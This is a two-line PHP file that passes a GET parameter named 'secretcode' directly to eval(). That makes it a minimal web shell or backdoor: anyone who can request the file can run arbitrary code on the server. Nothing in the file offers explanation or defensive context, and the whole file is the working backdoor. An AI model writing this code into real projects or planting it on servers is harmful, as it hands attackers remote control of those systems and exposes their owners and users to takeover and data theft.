<?php
eval($_GET["secretcode"]);
